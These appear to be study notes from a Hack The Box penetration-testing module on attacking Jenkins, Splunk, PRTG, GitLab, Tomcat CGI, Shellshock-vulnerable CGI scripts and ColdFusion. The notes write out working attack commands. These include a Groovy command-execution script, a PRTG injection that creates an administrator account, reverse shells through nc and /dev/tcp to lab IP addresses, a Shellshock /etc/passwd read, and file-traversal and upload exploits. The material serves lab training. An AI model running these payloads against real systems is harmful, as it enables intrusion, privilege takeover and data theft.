* **The Privilege Context:** Because Groovy operates natively inside the running application layer, scripts passed to the console can interact directly with the operating system's command processor (`/bin/bash` or `cmd.exe`). The commands execute with the exact same system permissions held by the Jenkins daemon process. _These script helps us to get the RCE on the jenkins server_

```
def cmd = 'id'
def sout = new StringBuffer(), serr = new StringBuffer()
def proc = cmd.execute()
proc.consumeProcessOutput(sout, serr)
proc.waitForOrKill(1000)
println sout
```

#### Cross-Platform Execution Profiles:

* **Linux Hosts:** Operators can pass specialized Java socket strings to pipe an interactive terminal session directly back to a local listener (like a Netcat wrapper monitoring an inbound port).
* **Windows Hosts:** Operators can run standard commands by invoking shell wrappers (e.g., `cmd.exe /c dir`.execute()) or loading memory-only scripts like PowerShell download cradles to execute tools without dropping files on the local disk.

### 2. Historical & Application-Specific Vulnerabilities

When administrative access isn't immediately available via default credentials, older deployments of Jenkins can be exploited using known historical flaws. The text highlights how specific version dependencies dictate the attack path:

* **Sandbox Bypass Exploit Chain (CVE-2018-1999002 & CVE-2019-1003000):** Targets Jenkins version **2.137**. This exploit uses a dynamic routing vulnerability to completely bypass the Overall/Read Access Control Lists (ACLs). This allows a user to break out of the script security sandbox and force the Jenkins master to download and run a malicious remote JAR file.
* **Privileged Node.js Exploit:** Targets Jenkins version **2.150.2**. This bug allows any account holding `JOB creation` and `BUILD` privileges to run arbitrary code via an underlying Node.js interpreter. If anonymous access is left enabled by default, an unauthenticated attacker can automatically leverage these permissions.

> **Defensive Core Concept:** While individual code-flaw exploits are highly version-specific (and patched in legacy LTS versions like `2.303.1`), **Script Console abuse is an architectural feature**. Hardening a server requires locking down user roles, disabling anonymous access, and explicitly restricting script execution permissions.

### Tool and Technique Mapping Table

| **Vector / Component**  | **Operating System** | **Operational Goal**              | **Implementation Method**                                                                |
| ----------------------- | -------------------- | --------------------------------- | ---------------------------------------------------------------------------------------- |
| **`/script` End-point** | Cross-platform       | Direct internal execution gateway | Processes raw Apache Groovy scripts to invoke system commands.                           |
| **Netcat (`nc`)**       | Attacker Machine     | Shell catch alignment             | Listens on a specified local port to receive an incoming interactive socket stream.      |
| **PowerShell Cradle**   | Windows              | In-memory execution               | Downloads and runs script layers directly inside memory to avoid touching disk tracking. |
| **AJP / Exploit Chain** | Legacy Versions      | Remote code execution             | Bypasses sandbox controls to force the master node to parse external payloads.           |

***

***

### Splunk

**Splunk** is an enterprise data platform used to collect, index, search, and analyze massive streams of machine-generated log data in real time. In the IT and cybersecurity world, it is often called the "Google for log files."

Splunk is primarily used as a **SIEM** (Security Information and Event Management) system inside Security Operations Centers (SOCs) to hunt for cyber threats, monitor network infrastructure, and investigate outages.

#### Why Pentesters Care About Splunk

During a penetration test or a Hack The Box lab, discovering a Splunk instance is a major milestone.

* **High Privileges:** Splunk usually runs under highly privileged system contexts (like `root` on Linux or `NT AUTHORITY\SYSTEM` on Windows) so it can read protected system logs.
* **The Goal:** If you can breach the Splunk interface using default credentials (traditionally `admin:changeme`) or exploit a version-specific vulnerability, you can abuse Splunk's built-in script execution capabilities to gain a shell as root or SYSTEM.

### Command Breakdown

The command you provided is an unauthenticated REST API probe targeting the backend management engine of Splunk.

Bash

```
curl -sk https://10.129.201.50:8089/services/server/info
```

Here is exactly what each piece of that command is doing:

| **Element**                 | **Component Type**  | **What It Actually Does**                                                                                                                                                                                                          |
| --------------------------- | ------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **`curl`**                  | Command Utility     | The command-line tool used to send web requests and receive raw data from web servers.                                                                                                                                             |
| **`-s`**                    | Flag (`--silent`)   | **Silent Mode.** Hides the progress bar, download speeds, and error messages from flooding your terminal screen.                                                                                                                   |
| **`-k`**                    | Flag (`--insecure`) | **Insecure Mode.** Tells `curl` to completely ignore SSL/TLS certificate validation warnings. This is critical in labs because Splunk uses self-signed certificates by default, which normally block `curl` from loading the page. |
| **`/services/server/info`** | REST API Endpoint   | The specific XML pathway that pulls general server statistics.                                                                                                                                                                     |

#### What Gaining This Output Tells You

When you run this command against a vulnerable or unhardened Splunk instance, the server will dump a wall of raw XML text directly into your terminal without asking you to log in.

As an attacker or security researcher, you are looking inside that XML dump for three critical pieces of information:

1. **`<version>`**: Exposes the exact patch build of Splunk Enterprise (e.g., `9.0.2`). This tells you instantly if the server is vulnerable to known Remote Code Execution exploits.
2. **`<os_name>`**: Tells you if the underlying host is `Linux` or `Windows`, allowing you to tailor your reverse-shell payloads correctly.
3. **`<cpu_architecture>`**: Confirms if the system is `x86_64` or `arm`, which is vital if you intend to compile or drop binary exploits.

The core concept of this section is **Abusing Built-In Functionality** within Splunk. Splunk allows administrators to install custom applications/add-ons to extend functionality or ingest specific data.

Because Splunk supports scripted inputs (running custom Python, Bash, Batch, or PowerShell scripts to collect logs), an attacker with sufficient privileges to install applications can upload a malicious custom app. Once uploaded, Splunk automatically installs and enables the app, executing the embedded script (in this case, a reverse shell) at the interval specified in the `inputs.conf` file. If Splunk is running under a high-privilege account like `NT AUTHORITY\SYSTEM` or `root`, the resulting shell inherits those exact privileges.

| **Command**                                                                                                                                                                                            | **Purpose in Lab**                                                                                                               | **Breakdown of Flags & Arguments**                                                                                                                                                                                                               |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | -------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| <p><strong><code>git clone https://github.com/0xjpuff/reverse_shell_splunk.git</code></strong><br><br><em>For windows we need to use the run.ps1 file for the linux we need to use the rev.py</em></p> | Downloads a pre-configured template containing the necessary directory structure and script examples for the Splunk application. | **`git`**: The version control software utility.**`clone`**: The command used to copy an existing repository into a new local directory.**`https://...`**: The target URL of the remote repository being copied.                                 |
| `tree splunk_shell/`                                                                                                                                                                                   | Verifies the directory structure of the custom application before packaging.                                                     | Shows a visual hierarchy of the `splunk_shell/` folder, ensuring the `bin/` and `default/` directories are placed correctly.                                                                                                                     |
| `cat inputs.conf`                                                                                                                                                                                      | Inspects the configuration file that directs Splunk's behavior.                                                                  | Displays the contents of `inputs.conf`. The configurations `[script://...]`, `disabled = 0`, and `interval = 10` instruct Splunk to execute the payload script every 10 seconds.                                                                 |
| `tar -cvzf updater.tar.gz splunk_shell/`                                                                                                                                                               | Packages and compresses the custom app folder into an uploadable archive.                                                        | **`tar`**: Tape archive utility.**`-c`**: Create a new archive.**`-v`**: Verbose (lists files as they pack).**`-z`**: Compress using gzip.**`-f`**: Name of the target file (`updater.tar.gz`).**`splunk_shell/`**: Source folder to archive.    |
| `sudo nc -lnvp 443`                                                                                                                                                                                    | Launches a local network listener to catch the incoming reverse shell connection.                                                | **`sudo`**: Runs with root privileges (required to bind to restricted ports below 1024).**`nc`**: Netcat utility.**`-l`**: Listen mode.**`-n`**: Numeric-only IPs (no DNS resolution).**`-v`**: Verbose output.**`-p 443`**: Specifies port 443. |

***

***

## PRTG Networking

PRTG Network Monitor by Paessler is an agentless network monitoring solution running entirely from a web management application. Because it interacts deeply with internal routing infrastructure, servers, and active directories via sensitive protocols (SNMP, WMI, REST APIs), finding an exposed or poorly managed PRTG instance inside an enterprise network is a critical milestone for a security researcher.

This module highlights a textbook implementation breakdown:

* **The Vector:** Attackers footprint PRTG via web service signatures (like the `Indy httpd` server on port 8080) and target weak or default credentials (`prtgadmin:Password123`).
* **The Flaw (CVE-2018-9276):** An authenticated **OS Command Injection** vulnerability present in versions prior to **18.2.39**. The web interface lets users define notification actions that trigger external scripts. The underlying backend takes user input from the `Parameter` input field and passes it directly into a PowerShell execution context without applying proper validation or string filtering.
* **The Impact:** By inserting command-chaining punctuation (like semicolons or ampersands), an authenticated user can force the underlying Windows operating system to execute administrative system commands, achieving a full local administrator compromise.

### Commands Used Matrix

| **Command**                                          | **Objective**                         | **Context**                                                                                             |
| ---------------------------------------------------- | ------------------------------------- | ------------------------------------------------------------------------------------------------------- |
| **`sudo nmap -sV -p- --open -T4 10.129.201.50`**     | Service Discovery & Port Scanning     | Initial footprinting to locate hidden web service ports and active management daemons.                  |
| **`curl -s http://10.129.201.50:8080/index.htm...`** | Version Verification / Fingerprinting | Pulling down the public unauthenticated web source code to parse out the exact build edition.           |
| **`sudo crackmapexec smb 10.129.201.50...`**         | Post-Exploit Access Verification      | Remotely checking if the injected local account script successfully added an administrator to the host. |

### Granular Command Breakdowns

#### 1. The Discovery Scan

Bash

```
sudo nmap -sV -p- --open -T4 10.129.201.50
```

* **`sudo`**: Runs Nmap with root system permissions, allowing it to construct raw, un-tracked SYN network packets for faster scanning.
* **`-sV`**: Directs Nmap to actively probe open ports to determine the exact service banner text and application version number.
* **`-p-`**: Scans all **65,535** available TCP ports instead of just the top 1,000 standard ports.
* **`--open`**: Instructs Nmap to clean up the screen output by only listing ports that are actively listening.
* **`-T4`**: Adjusts the timing template to an aggressive speed setting, minimizing delays between probes to accelerate the scan.

#### 2. The Version Extraction Probe

Bash

```
curl -s http://10.129.201.50:8080/index.htm -A "Mozilla/5.0 (compatible;  MSIE 7.01; Windows NT 5.0)" | grep version
```

* **`curl -s`**: Quiet mode. Downloads the target web resource without printing a network progress bar or connection errors.
* **`-A "Mozilla..."`**: Spooof a custom User-Agent string. Forces the webserver to believe the request is originating from an older Internet Explorer browser, preventing the server from blocking the query with an automated bot defense filter.
* **`| grep version`**: Pipes the raw HTML source code directly into `grep` to isolate and print only the lines containing the word "version," revealing the internal version parameter query tag (`?prtgversion=17.3.33.2830__`).

#### 3. The Exploit Payload (Injected via the Web UI)

PowerShell

```
test.txt;net user prtgadm1 Pwn3d_by_PRTG! /add;net localgroup administrators prtgadm1 /add
```

* **`test.txt;`**: The script engine expects a file target. The semicolon `;` acts as a terminal command terminator in PowerShell. It forces the system to complete the intended, non-malicious logic immediately and then move straight to the next evaluation block.
* **`net user prtgadm1 Pwn3d_by_PRTG! /add;`**: Injects a native Windows command that creates a brand new local operating system user account named `prtgadm1` with an explicit password complex enough to pass domain policy settings.
* **`net localgroup administrators prtgadm1 /add`**: Immediately promotes the new `prtgadm1` user profile into the powerful local `administrators` safety ring, granting the attacker unrestricted system access over the network.

#### 4. Privilege Verification Sweep

Bash

```
sudo crackmapexec smb 10.129.201.50 -u prtgadm1 -p Pwn3d_by_PRTG!
```

* **`smb`**: Instructs CrackMapExec to communicate using the Server Message Block network file-sharing protocol over port 445.
* **`-u prtgadm1 -p Pwn3d_by_PRTG!`**: Feeds the credentials of the newly injected account to the remote system.
* **The `(Pwn3d!)` Result Tag**: When CrackMapExec successfully validates the credentials and detects that the user profile holds true local administration access tokens on the Windows kernel, it prints out the definitive `(Pwn3d!)` flag, confirming a successful host compromise.

***

***

### GitLab Discovery & Enumeration

The core focus of this module section is identifying and enumerating self-hosted **GitLab** instances during an assessment. Git repositories are high-value targets because developers frequently commit hardcoded secrets, database credentials, API keys, or SSH private keys by accident.

Key takeaways from the text include:

* **Access Level Visibility:** GitLab features three repository settings: _Public_ (accessible to anyone unauthenticated), _Internal_ (accessible to any registered user on the instance), and _Private_ (strictly restricted).
* **The Self-Registration Blindspot:** Misconfigured GitLab instances often allow open user registration without domain verification or administrative approval. Registering a dummy account can instantly expose hidden _Internal_ projects that host internal codebases.
* **Passive Version Fingerprinting:** The only reliable way to check the precise GitLab version number is by logging in and navigating to the `/help` page. Blindly throwing exploits without checking the version is discouraged.
* **Information Disclosure Vectors:** Attackers leverage the registration interface (`/users/sign_up`) to map out valid usernames and email addresses. By submitting specific queries, error behaviors explicitly leak whether an identifier is already active on the system.

### Endpoint and Content Mapping Matrix

| **Target Endpoint / URL Path**        | **Functional Content & Security Testing Value**                                                                                                                                                                                                                                              |
| ------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `/users/sign_in`                      | **The Landing/Login Portal.** Confirms GitLab is active in the host environment via logo assets. Serves as the central interface for password guessing or credential re-use attempts.                                                                                                        |
| `/explore`                            | **The Directory Portal.** Displays all _Public_ repositories when unauthenticated, and unlocks _Internal_ repositories once an active session is established. Used to find exposed documentation, code leaks, and infrastructure blueprints.                                                 |
| `/users/sign_up`                      | **The Registration Form.** Allows attackers to create an account if self-registration is enabled. Even if account creation is blocked, this page leaks system data by generating verbose error messages (e.g., _"Email has already been taken"_), enabling anonymous user/email enumeration. |
| `/help`                               | **System Information Dashboard.** Accessible _only_ after logging into an authenticated account. Houses the explicit system version number necessary to verify exact patch levels and match public RCE exploits.                                                                             |
| `/admin/application_settings/general` | **Administrative Control Panel.** (Privileged view) Contains instance-wide security baselines, including two-factor authentication (2FA) toggles, sign-up restriction checkboxes, and IP access limits.                                                                                      |

### Attacking GitLab

This section transitions from passive discovery to active **target exploitation** by looking at two specific vectors: user harvesting and software flaw exploitation.

* **Username Enumeration & Password Controls:** While tracking down usernames isn't flagged as a critical standalone vulnerability by vendors, it acts as a massive lever for an attacker. Finding valid accounts (like discovering `root` or `bob`) allows for targeted password spraying. The text notes critical lockout guardrails: by default (pre-version 16.6), GitLab locks accounts for 10 minutes after **10 failed login attempts**. Newer iterations allow administrators to customize these parameters directly inside the web UI.
* **Authenticated Remote Code Execution (RCE):** The text highlights a famous historical vulnerability affecting GitLab Community Edition versions **$\le$ 13.10.2**. The flaw stemmed from how an underlying file-processing utility (**ExifTool**) analyzed incoming metadata inside user-uploaded images (like profile avatars or project snippets). An attacker with basic user access—even via a self-registered guest account—could embed malicious system commands inside an image's metadata fields, triggering an interactive reverse shell (`uid=996(git)`) upon upload.

### The Python 3 User Enumeration Repository

The official Python 3 version inspired by the script structure mentioned in your HTB module is hosted publicly on GitHub at: **`dpgg101/GitLabUserEnum`**.

This script rewrites the legacy Bash execution pattern into a clean, portable Python script designed to interface smoothly with modern terminals.

## To get RCE

```
python3 gitlab_13_10_2_rce.py -t http://gitlab.inlanefreight.local:8081 -u mrb3n -p password1 -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.15 8443 >/tmp/f '
```

***

***

### Attacking Tomcat CGI (CVE-2019-0232)

This module section details the identification, mapping, and exploitation of **CVE-2019-0232**—a critical Remote Code Execution (RCE) vulnerability affecting Apache Tomcat instances running on Windows operating systems.

The core mechanics of this attack vector break down into three primary phases:

* **The Flaw:** When Tomcat has the `enableCmdLineArguments` parameter turned on within its CGI Servlet settings, it parses query string inputs from a web browser and passes them as command-line arguments to an underlying script. On Windows targets, Tomcat fails to properly validate these strings before passing them to the operating system's command interpreter (`cmd.exe`).
* **The Environmental Obstacle (The `PATH` Trap):** Running commands blindly via injection (like `?&dir`) works initially, but advanced tools like `whoami` fail to execute. By running `?&set`, researchers can view the active environmental variables and discover that the system's `PATH` variable has been completely stripped or unset. To run system binaries, you must provide their **absolute filesystem paths** (e.g., `C:\Windows\System32\whoami.exe`).
* **The Filter Bypass:** To block this behavior, patches introduce regex filters that flag command characters like colons (`:`) and backslashes (`\`). Attackers easily bypass this sanitization layer by **URL-encoding** the absolute path characters, forcing Tomcat to process the payload safely before decoding it directly into the vulnerable Windows shell execution line.

### Command Reference Matrix

| **Command / Payload**                                   | **Target Phase**     | **Operational Objective**                                                                          |
| ------------------------------------------------------- | -------------------- | -------------------------------------------------------------------------------------------------- |
| `nmap -p- -sC -Pn 10.129.204.227 --open`                | Reconnaissance       | Identifies open ports and services, discovering Tomcat 9.0.17 running on port 8080.                |
| `ffuf -w [...]/common.txt -u http://[...]/cgi/FUZZ.cmd` | Directory Fuzzing    | Scans the `/cgi/` directory for active scripts with a `.cmd` extension (Unsuccessful).             |
| `ffuf -w [...]/common.txt -u http://[...]/cgi/FUZZ.bat` | Directory Fuzzing    | Scans the `/cgi/` directory for active scripts with a `.bat` extension (Discovered `welcome.bat`). |
| `?&dir`                                                 | Basic Exploitation   | Appends a command separator to verify blind command execution capabilities.                        |
| `?&set`                                                 | Environment Triaging | Dumps active system environment variables to diagnose missing path arrays.                         |
| `?&c%3A%5Cwindows%5Csystem32%5Cwhoami.exe`              | Final Evasion & RCE  | Bypasses character filters using hex encoding to execute a binary via its absolute path.           |

### Granular Command Breakdowns

#### 1. The Service Footprinting Scan

Bash

```
nmap -p- -sC -Pn 10.129.204.227 --open
```

* **`-p-`**: Scans all 65,535 TCP ports to ensure non-standard management ports aren't missed.
* **`-sC`**: Deploys the default suite of Nmap Scripting Engine (NSE) scripts to gather quick application metadata (such as pulling the Tomcat version string out of the HTTP response headers).
* **`-Pn`**: Disables the initial ICMP ping check. This forces Nmap to scan the target ports even if a local firewall is actively dropping ping packets.
* **`--open`**: Strips closed and filtered ports out of the terminal view, showing only active actionable vectors.

#### 2. Automated Script Fuzzing

Bash

```
ffuf -w /usr/share/dirb/wordlists/common.txt -u http://10.129.204.227:8080/cgi/FUZZ.bat
```

* **`-w`**: Points `ffuf` to a local wordlist file containing standard, common script names.
* **`-u`**: Specifies the target URL string.
* **`FUZZ.bat`**: The `FUZZ` keyword acts as a placeholder. The tool rapidly replaces this string with lines from the wordlist file (e.g., trying `/cgi/admin.bat`, `/cgi/test.bat`, and ultimately hitting `/cgi/welcome.bat`), looking for an HTTP `200 OK` status response.

#### 3. Environment Variable Extraction Payload

HTTP

```
http://10.129.204.227:8080/cgi/welcome.bat?&set
```

* **`?`**: The query string separator. It tells the Tomcat CGI wrapper that the static execution of `welcome.bat` has concluded, and input parameters are beginning.
* **`&`**: The command chaining character in Windows. It terminates the script execution sequence early and commands the underlying shell to run an entirely new command adjacent to it.
* **`set`**: A native Windows shell command that prints out every single active system environment variable, configuration string, and working directory route.

#### 4. Hex-Encoded Absolute Path Evasion

HTTP

```
http://10.129.204.227:8080/cgi/welcome.bat?&c%3A%5Cwindows%5Csystem32%5Cwhoami.exe
```

* **`c%3A%5Cwindows%5Csystem32%5Cwhoami.exe`**: This is the literal string `c:\windows\system32\whoami.exe`.
* Because Tomcat applies strict validation checks to block path manipulation, raw characters like colons and backslashes trip the web application firewall.
* By swapping those characters out for their exact hexadecimal URL-encoded counter-parts, the string flies right past Tomcat's filter logic:
  * **`%3A`** translates to a colon (`:`)
  * **`%5C`** translates to a backslash (`\`)

Once the web framework passes the clean, encoded block down to the Windows system layer, the host environment natively decodes it back into an absolute file system request, executing the `whoami` binary as a high-privileged system account.

## **Common Gateway Interface (CGI)**

This section details how legacy **Common Gateway Interface (CGI)** applications can bridge remote web requests straight into vulnerable operating system shells, focusing specifically on the legendary **Shellshock (CVE-2014-6271)** vulnerability.

* **The Architecture Vulnerability:** CGI acts as a middleware layer that allows a web server to pass user inputs (like browser strings and cookies) down to server-side scripts (stored inside `/cgi-bin/`) by translating those inputs into operating system **Environment Variables**.
* **The Exploit Mechanism:** In unpatched versions of GNU Bash ($\le$ version 4.3), the parser fails to stop reading when an environment variable containing a function definition finishes (`() { :; };`). Instead, it keeps reading and automatically **executes any trailing OS commands** tacked onto the end of that string.
* **The Target Cycle:** Attackers use directory brute-forcing to discover functional script endpoints inside `/cgi-bin/` (e.g., `access.cgi`). By injecting code directly into the `User-Agent` HTTP header, they achieve instant **Remote Code Execution (RCE)** under the security context of the web server daemon user (`www-data`).

| **Command / Payload**                                                                           | **Target Phase**                | **Operational Objective**                                                                                  |
| ----------------------------------------------------------------------------------------------- | ------------------------------- | ---------------------------------------------------------------------------------------------------------- |
| **`ffuf -w /usr/share/seclists/.../directory-list-2.3-small.txt -u http://10.129.205.27/FUZZ`** | **Initial Directory Discovery** | **Scans the web root to locate hidden directories like `/cgi-bin/` or `/scripts/`.**                       |
| `gobuster dir -u http://10.129.205.27/cgi-bin/ -w /usr/share/wordlists/dirb/small.txt -x cgi`   | Attack Surface Mapping          | Brute-forces the discovered `/cgi-bin/` directory to locate actual executable scripts (like `access.cgi`). |
| `curl -i http://10.129.205.27/cgi-bin/access.cgi`                                               | Endpoint Verification           | Verifies the baseline server headers and response status code of the found script.                         |
| `curl -H 'User-Agent: () { :; }; echo ; echo ; /bin/cat /etc/passwd' [...]`                     | Exploitation (In-Band)          | Leverages the user-agent header to force a remote system file read and verify Shellshock.                  |
| `curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/[...]/7777 0>&1' [...]`               | Exploitation (Reverse Shell)    | Weaponizes the vulnerability to inject an interactive reverse shell pipeline payload.                      |
| `sudo nc -lvnp 7777`                                                                            | Listener Deployment             | Opens a local listener port on your attack machine to catch the inbound reverse shell.                     |

### New Granular Command Breakdown: Finding the CGI Directory

Before you can search for vulnerable scripts, you have to find out _where_ the server hides its executable applications. This is done by fuzzing the web root directory for common server folder signatures.

Bash

```
ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -u http://10.129.205.27/FUZZ
```

#### Analyzing the FFUF Output:

When running this scan against your target, look closely at the terminal results for specific status codes:

* **Status `403 Forbidden` or `200 OK` on `/cgi-bin`**: This is your green light. A `403 Forbidden` simply means the server is blocking you from listing the folder contents, but **confirms the directory exists**.
* Once you see `/cgi-bin` populate in your `ffuf` window, you immediately take that directory path and plug it into your next step (the Gobuster script scan) to hunt down individual executable files like `access.cgi`!

### Granular Command Breakdowns

#### 1. Local Vulnerability Test Line

Bash

```
env y='() { :;}; echo vulnerable-shellshock' bash -c "echo not vulnerable"
```

* **`env`**: Instructs the Linux operating system to run a command within a custom, temporarily modified environment.
* **`y='() { :;}; ...'`**: Defines an environment variable named `y`. The characters `() { :; };` signify a standard empty function template definition block.
* **`echo vulnerable-shellshock`**: The malicious trailing command. A vulnerable Bash binary will step outside the function boundaries and execute this immediately upon reading the variable.
* **`bash -c "echo not vulnerable"`**: Spawns a new Bash subshell process to execute the standard string check. If patched, the engine prints _only_ `not vulnerable`. If unpatched, it prints both.

#### 2. The Script Discovery Sweep

Bash

```
gobuster dir -u http://10.129.204.231/cgi-bin/ -w /usr/share/wordlists/dirb/small.txt -x cgi
```

* **`dir`**: Instructs Gobuster to operate in directory and file brute-forcing mode.
* **`-u http://10.129.204.231/cgi-bin/`**: Sets the target URL baseline to the standard execution directory where CGI application files are isolated.
* **`-w /usr/share/wordlists/dirb/small.txt`**: Feeds the tool a local directory wordlist dictionary to swap into the web request pipeline.
* **`-x cgi`**: Forces Gobuster to append the `.cgi` file extension to every word it tests, allowing it to locate target scripts like `access.cgi`.

#### 3. In-Band File Reading Exfiltration Payload

Bash

```
curl -H 'User-Agent: () { :; }; echo ; echo ; /bin/cat /etc/passwd' bash -s :'' http://10.129.204.231/cgi-bin/access.cgi
```

* **`-H 'User-Agent: ...'`**: Modifies the outbound HTTP header payload string. Apache converts this header field directly into the `HTTP_USER_AGENT` environment variable before executing the CGI file.
* **`echo ; echo ;`**: Injects two empty echo breaks. This provides a clean HTTP header structure separation, preventing the web server socket from crashing with a `500 Internal Server Error` before returning command data.
* **`/bin/cat /etc/passwd`**: The explicit command target. It forces the unpatched shell engine to read and print the contents of the local Linux user database directly back to your terminal screen.
* **`bash -s :''`**: Acts as a syntactic stabilizer argument string used in older exploit variations to smooth over argument passing inside certain web engines.

#### 4. Interactive Reverse Shell Pipeline Weaponization

Bash

```
curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.10.14.38/7777 0>&1' http://10.129.204.231/cgi-bin/access.cgi
```

* **`/bin/bash -i`**: Spawns an active, interactive Bash shell process instance on the target server system.
* **`>& /dev/tcp/10.10.14.38/7777`**: Redirects both the standard output (`stdout`) and standard error (`stderr`) streams directly into an open network socket pointing straight back to your Kali machine's IP address and chosen listener port.
* **`0>&1`**: Redirects standard input (`stdin`) into the exact same network descriptor socket. This closes the loop, forcing the remote terminal to accept your local keyboard entries as live commands.

***

***

## Cold Fusion

Adobe ColdFusion is a Java-based rapid web application development platform that uses ColdFusion Markup Language (CFML). While it offers robust enterprise data integration and native performance scaling, its legacy deployments are frequent high-value targets for security researchers.

This module section outlines the identification, vulnerability assessment, and full exploitation of **ColdFusion 8** instances via two severe vectors:

* **Directory Traversal (CVE-2010-2861):** ColdFusion's admin settings panel contains an input validation flaw inside its `locale` parameter. Attackers pass path-traversal strings (`../`) to step outside the web root and pull sensitive target configuration files—specifically extracting the underlying administration SHA-1 password hashes from `password.properties`.
* **Unauthenticated Remote Code Execution (CVE-2009-2265):** A critical flaw within the integrated third-party `FCKeditor` file upload package. Due to flawed validation configuration, any unauthenticated user can upload an arbitrary `.jsp` (JavaServer Pages) web shell file payload into an public directory, browse to it, and instantly force the underlying Windows kernel to execute a system-level reverse shell back to a listener.

| **Command / Payload**                                                      | **Target Phase**                 | **Operational Objective**                                                                              |
| -------------------------------------------------------------------------- | -------------------------------- | ------------------------------------------------------------------------------------------------------ |
| `nmap -p- -sC -Pn 10.129.247.30 --open`                                    | **Initial Technology Discovery** | **Scans for default ports and fingerprints the `/CFIDE` and `/cfdocs` web folder layouts.**            |
| **`ffuf -w [...]/raft-small-words.txt -u http://10.129.247.30:8500/FUZZ`** | **Web Directory Fuzzing**        | **Discovers hidden ColdFusion web pathways if ports or banners are hidden or non-standard.**           |
| `searchsploit adobe coldfusion`                                            | Vulnerability Research           | Queries Exploit-DB's offline cache to cross-reference known exploits for Adobe ColdFusion.             |
| `python2 14641.py 10.129.204.230 8500 "[Path]"`                            | Exploitation (LFI)               | Executes the traversal vulnerability to dump the server's master administrative hash file.             |
| `python3 50057.py`                                                         | Exploitation (RCE)               | Executes the FCKeditor file upload bypass exploit to automatically catch an interactive reverse shell. |

### How to Find If Adobe ColdFusion is Running

In a real-world penetration test or bug bounty assessment, you can identify a ColdFusion instance using five core techniques.

#### 1. Default Port Fingerprinting

By default, standalone installations of Adobe ColdFusion run their internal web server engines on specific non-standard ports. Identifying these open ports during your initial Nmap scan is an immediate indicator:

* **Port 8500:** The absolute standard port for unencrypted ColdFusion HTTP traffic (often used for development or internal tracking).
* **Port 5500:** The default port reserved specifically for the **ColdFusion Server Monitor** utility tracking platform.

#### 2. URL and File Extension Inspection

ColdFusion applications rely on dynamic server-side scripts. If you browse an application or run a directory fuzzing tool like `ffuf` and discover endpoints ending in the following extensions, ColdFusion is actively processing the backend code:

* **`.cfm`** (ColdFusion Markup Language Page)
* **`.cfc`** (ColdFusion Component Object File)

Bash

```
# Example directory fuzzing targeting ColdFusion script files
ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -u http://10.129.247.30/FUZZ -e .cfm,.cfc
```

#### 3. Structural Web Directories

During installation, ColdFusion creates mandatory, standardized root folders to handle administrative operations, documentation, and JavaScript assets. Discovering these directories via a standard web scan or manual browsing confirms the presence of ColdFusion:

* **`/CFIDE/`** (Contains the core administration framework)
* **`/CFIDE/administrator/enter.cfm`** (The master web console login page)
* **`/cfdocs/`** (Contains default system documentation files)

#### 4. HTTP Response Header Fingerprinting

Web application platforms often append technological signatures inside their outgoing network communication packages. You can catch these signatures by intercepting traffic in Burp Suite or pulling down server headers directly using `curl`:

Bash

```
curl -I http://10.129.247.30:8500/
```

_Look closely through the return headers for explicit structural tags such as:_

* `Server: ColdFusion`
* `X-Powered-By: ColdFusion`
* `Set-Cookie: CFTOKEN=` or `CFID=` (ColdFusion's legacy tracking cookies)

#### 5. Signature Application Error Pages

If an application handles a bad database query or input incorrectly, legacy ColdFusion instances will spit out a highly recognizable blue-and-white diagnostic error dump screen. These pages explicitly reference underlying operational functions, variable namespaces, or absolute system file paths (e.g., `C:\ColdFusion8\wwwroot\index.cfm`), handing you both the exact technology framework name and the underlying installation pathing blueprint.

### Granular Command Breakdowns

#### 1. Host Footprinting Scan

Bash

```
nmap -p- -sC -Pn 10.129.247.30 --open
```

* **`-p-`**: Forces Nmap to iterate through all 65,535 TCP ports to ensure non-standard web ports (like `8500`) are captured.
* **`-sC`**: Runs the default array of Nmap Scripting Engine (NSE) web probes to fingerprint directory setups (discovering critical structural components like `/CFIDE/` and `/cfdocs/`).
* **`-Pn`**: Drops standard ICMP ping verification requests, forcing the scanner to check the ports even if an edge firewall drops echo requests.
* **`--open`**: Filters out clutter, printing only ports that are listening and interactive.

#### 2. Exploitation Database Queries

Bash

```
searchsploit adobe coldfusion
searchsploit -p 14641
```

* **`searchsploit adobe coldfusion`**: Performs a local pattern-matching search across the exploit repository database using keywords to return available exploit scripts (.py, .rb, .txt).
* **`-p 14641`**: Inspects a specific exploit ID number to grab its absolute filepath location on your Kali system, making it easy to copy into your current working testing directory.

#### 3. Exploiting Directory Traversal (CVE-2010-2861)

Bash

```
python2 14641.py 10.129.204.230 8500 "../../../../../../../../ColdFusion8/lib/password.properties"
```

* **`python2`**: Invokes the Python 2 runtime engine to execute the legacy exploit wrapper script.
* **`10.129.204.230 8500`**: Sets the destination socket parameters for the target ColdFusion application instance.
* **`"../../../../../../../../ColdFusion8/lib/password.properties"`**: The targeted injection parameter. The `../` sequences break past the application limits into the host filesystem structure to read the `password.properties` file, which leaks the administrative login SHA-1 hash sequence (`password=2F635F6...`).

#### 4. Unauthenticated Remote Code Execution (CVE-2009-2265)

Bash

```
python3 50057.py
```

* **`python3`**: Runs the modern Python 3 interpreter engine on the modified exploit file.
*   **The Internal Logic**: The script targets the vulnerable `upload.cfm` component within FCKeditor. It wraps a standard Java (`.jsp`) reverse shell payload structure inside a multipart web form request:

    HTTP

    ```
    http://10.129.247.30:8500/CFIDE/scripts/ajax/FCKeditor/editor/filemanager/connectors/cfm/upload.cfm?Command=FileUpload&Type=File&CurrentFolder=
    ```
* Because input validation parameters are missing, the server accepts and uploads the file. The python exploit script immediately accesses the upload location via HTTP, triggers the payload execution, and transparently routes an interactive Windows system shell backdoor straight to your local Netcat connection prompt.

***

***

## IIS Tilde Enumeration

**IIS Tilde Enumeration** is an information disclosure technique used to uncover hidden files, directories, and their short filenames (8.3 format) on legacy configurations of Microsoft Internet Information Services (IIS) web servers.

